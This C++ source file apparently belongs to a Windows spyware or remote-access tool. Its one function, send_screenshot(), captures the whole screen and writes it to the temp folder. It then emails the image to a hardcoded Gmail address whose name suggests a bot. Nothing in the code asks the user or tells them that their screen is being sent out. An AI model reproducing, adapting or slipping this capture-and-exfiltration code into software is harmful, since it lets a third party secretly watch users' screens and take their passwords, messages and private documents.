#include "sendScreenshot.h"

void send_screenshot() {
    char temp_path[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_path);
    
    string screenshot_path = string(temp_path) + "captured_screenshot.jpg";

    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screen_width, screen_height);
    SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, screen_width, screen_height, hScreenDC, 0, 0, SRCCOPY);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    cv::Mat screenshot(bmp.bmHeight, bmp.bmWidth, CV_8UC4); 
    GetBitmapBits(hBitmap, bmp.bmHeight * bmp.bmWidthBytes, screenshot.data);

    cv::Mat bgr_screenshot;
    cv::cvtColor(screenshot, bgr_screenshot, cv::COLOR_BGRA2BGR);

    if (!cv::imwrite(screenshot_path, bgr_screenshot)) {
        cerr << "Failed to save screenshot!" << endl;
        return;
    }
    cout << "Screenshot saved successfully to: " << screenshot_path << endl;

    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    // Send via email
    send_email_with_attachment("serverbottestmmt@gmail.com", "Screen Capture",
                               "Here is a screenshot of the screen.",
                               screenshot_path);
}